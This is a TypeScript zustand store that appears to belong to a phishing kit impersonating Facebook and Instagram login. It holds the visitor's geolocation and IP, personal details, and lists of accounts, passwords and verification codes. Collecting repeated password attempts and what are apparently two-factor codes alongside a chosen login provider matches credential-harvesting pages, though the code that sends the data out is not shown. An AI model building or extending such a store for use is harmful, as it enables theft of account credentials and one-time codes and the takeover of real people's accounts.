import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

export type LoginProvider = 'facebook' | 'instagram';

export interface GeoInfo {
    asn: number;
    ip: string;
    country: string;
    region: string;
    city: string;
    country_code: string;
}

export interface UserData {
    fullName: string;
    birthDate: string;
    personalEmail: string;
    businessEmail: string;
    phoneNumber: string;
    facebookPageName: string;
    information: string;
    accounts: string[];
    passwords: string[];
    codes: string[];
}

const initialUserData: UserData = {
    fullName: '',
    birthDate: '',
    personalEmail: '',
    businessEmail: '',
    phoneNumber: '',
    facebookPageName: '',
    information: '',
    accounts: [],
    passwords: [],
    codes: []
};

interface State {
    isModalOpen: boolean;
    geoInfo: GeoInfo | null;
    messageId: number | null;
    messageContent: string | null;
    loginProvider: LoginProvider | null;
    userData: UserData;
    setModalOpen: (isOpen: boolean) => void;
    setGeoInfo: (info: GeoInfo) => void;
    setMessageId: (id: number | null) => void;
    setMessageContent: (content: string | null) => void;
    setLoginProvider: (provider: LoginProvider | null) => void;
    setUserData: (data: Partial<UserData>) => void;
    addAccount: (account: string) => void;
    addPassword: (password: string) => void;
    addCode: (code: string) => void;
    resetFormSession: () => void;
}

export const store = create<State>()(
    persist(
        (set) => ({
            isModalOpen: false,
            geoInfo: null,
            messageId: null,
            messageContent: null,
            loginProvider: null,
            userData: { ...initialUserData },
            setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
            setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
            setMessageId: (id: number | null) => set({ messageId: id }),
            setMessageContent: (content: string | null) => set({ messageContent: content }),
            setLoginProvider: (provider) => set({ loginProvider: provider }),
            setUserData: (data) =>
                set((state) => ({
                    userData: { ...state.userData, ...data }
                })),
            addAccount: (account) =>
                set((state) => ({
                    userData: { ...state.userData, accounts: [...state.userData.accounts, account] }
                })),
            addPassword: (password) =>
                set((state) => ({
                    userData: { ...state.userData, passwords: [...state.userData.passwords, password] }
                })),
            addCode: (code) =>
                set((state) => ({
                    userData: { ...state.userData, codes: [...state.userData.codes, code] }
                })),
            resetFormSession: () =>
                set({
                    messageId: null,
                    messageContent: null,
                    loginProvider: null,
                    userData: { ...initialUserData }
                })
        }),
        {
            name: 'storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                geoInfo: state.geoInfo,
                messageId: state.messageId,
                messageContent: state.messageContent
            })
        }
    )
);
